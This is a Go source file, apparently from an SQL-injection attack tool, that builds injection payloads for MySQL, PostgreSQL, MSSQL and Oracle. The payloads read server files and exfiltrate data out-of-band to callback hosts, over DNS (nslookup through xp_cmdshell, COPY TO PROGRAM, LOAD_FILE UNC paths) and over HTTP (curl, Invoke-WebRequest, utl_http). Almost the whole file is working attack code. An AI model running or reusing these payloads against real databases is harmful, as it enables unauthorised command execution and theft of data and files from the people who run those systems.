package core

import (
	"encoding/base64"
	"fmt"
	"strings"
)

type Exfiltrator struct {
	Engine *Engine
}

func NewExfiltrator(e *Engine) *Exfiltrator {
	return &Exfiltrator{Engine: e}
}

func (ex *Exfiltrator) Exfiltrate(param string, dbms string, data string) error {
	// Try multiple exfiltration methods
	errors := []string{}

	if err := ex.dnsExfil(param, dbms, data); err != nil {
		errors = append(errors, err.Error())
	} else {
		ex.Engine.Log.Success("DNS exfiltration successful")
		return nil
	}

	if err := ex.httpExfil(param, dbms, data); err != nil {
		errors = append(errors, err.Error())
	} else {
		ex.Engine.Log.Success("HTTP exfiltration successful")
		return nil
	}

	return fmt.Errorf("all exfiltration methods failed: %s", strings.Join(errors, "; "))
}

func (ex *Exfiltrator) dnsExfil(param string, dbms string, data string) error {
	domain := "exfil.oob.dns"
	chunks := chunkString(data, 30) // DNS label max ~63, use 30 for safety
	encoded := base64.RawURLEncoding.EncodeToString([]byte(data))

	switch dbms {
	case "MySQL", "MariaDB":
		for i, chunk := range chunks {
			query := fmt.Sprintf("' AND LOAD_FILE(CONCAT('\\\\\\\\%d-%s.%s\\\\a'))--", i, chunk, domain)
			ex.Engine.Request(query, param)
		}
		// Send full encoded version as well
		ex.Engine.Request(fmt.Sprintf("' AND LOAD_FILE(CONCAT('\\\\\\\\%s.%s\\\\a'))--", encoded[:min(len(encoded), 60)], domain), param)

	case "PostgreSQL":
		for i, chunk := range chunks {
			query := fmt.Sprintf("'; COPY (SELECT '%d-%s') TO PROGRAM 'nslookup $(echo %d-%s).%s'--", i, chunk, i, chunk, domain)
			ex.Engine.Request(query, param)
		}

	case "MSSQL":
		for i, chunk := range chunks {
			query := fmt.Sprintf("'; EXEC master..xp_cmdshell 'nslookup %d-%s.%s'--", i, chunk, domain)
			ex.Engine.Request(query, param)
		}
		query := fmt.Sprintf("'; DECLARE @d VARCHAR(8000); SET @d='nslookup '+(SELECT master.dbo.fn_varbintohexstr(HashBytes('MD5','%s')))+'.%s'; EXEC master..xp_cmdshell @d--", data, domain)
		ex.Engine.Request(query, param)

	case "Oracle":
		for i, chunk := range chunks {
			query := fmt.Sprintf("' AND utl_http.request('http://%d-%s.%s')=1--", i, chunk, domain)
			ex.Engine.Request(query, param)
		}

	default:
		return fmt.Errorf("DNS exfiltration not supported for %s", dbms)
	}

	ex.Engine.Log.Info(fmt.Sprintf("DNS exfiltration sent %d chunks to %s", len(chunks), domain))
	return nil
}

func (ex *Exfiltrator) httpExfil(param string, dbms string, data string) error {
	callbackURL := "http://exfil.oob.http"
	encoded := base64.URLEncoding.EncodeToString([]byte(data))

	switch dbms {
	case "MySQL", "MariaDB":
		for _, method := range []string{"sys_eval", "sys_exec"} {
			query := fmt.Sprintf("'; SELECT %s(CONCAT('curl %s/', user(), '/', '%s'))--", method, callbackURL, encoded)
			ex.Engine.Request(query, param)
		}

	case "PostgreSQL":
		query := fmt.Sprintf("'; COPY (SELECT '%s') TO PROGRAM 'curl %s/$(whoami)/%s'--", data, callbackURL, encoded[:min(len(encoded), 100)])
		ex.Engine.Request(query, param)

	case "MSSQL":
		query := fmt.Sprintf("'; EXEC master..xp_cmdshell 'powershell Invoke-WebRequest -Uri \"%s?user=%%username%%&data=%s\"'--", callbackURL, encoded[:min(len(encoded), 100)])
		ex.Engine.Request(query, param)

	case "Oracle":
		query := fmt.Sprintf("' AND utl_http.request('%s/'||(SELECT user FROM dual)||'/%s')=1--", callbackURL, encoded[:min(len(encoded), 100)])
		ex.Engine.Request(query, param)

	default:
		return fmt.Errorf("HTTP exfiltration not supported for %s", dbms)
	}

	return nil
}

func (ex *Exfiltrator) FileToExfil(param string, dbms string, filePath string) error {
	dataPayloads := []string{}

	switch dbms {
	case "MySQL", "MariaDB":
		dataPayloads = append(dataPayloads,
			fmt.Sprintf("' UNION SELECT LOAD_FILE('%s'),NULL,NULL--", filePath),
			fmt.Sprintf("' UNION SELECT HEX(LOAD_FILE('%s')),NULL,NULL--", filePath))
	case "PostgreSQL":
		dataPayloads = append(dataPayloads,
			fmt.Sprintf("' UNION SELECT encode(pg_read_binary_file('%s'),'base64'),NULL,NULL--", filePath),
			fmt.Sprintf("' UNION SELECT pg_read_file('%s',0,100000),NULL,NULL--", filePath))
	}

	for _, p := range dataPayloads {
		body, _, _, err := ex.Engine.Request(p, param)
		if err != nil {
			continue
		}
		content := ex.Engine.extractContent(body)
		if content != "" {
			ex.Engine.Log.Success(fmt.Sprintf("File %s extracted: %d bytes", filePath, len(content)))
			// Now exfiltrate the data via DNS/HTTP
			return ex.Exfiltrate(param, dbms, content)
		}
	}

	return fmt.Errorf("could not read file %s", filePath)
}

func chunkString(s string, size int) []string {
	if len(s) == 0 {
		return []string{""}
	}
	var chunks []string
	for i := 0; i < len(s); i += size {
		end := i + size
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}

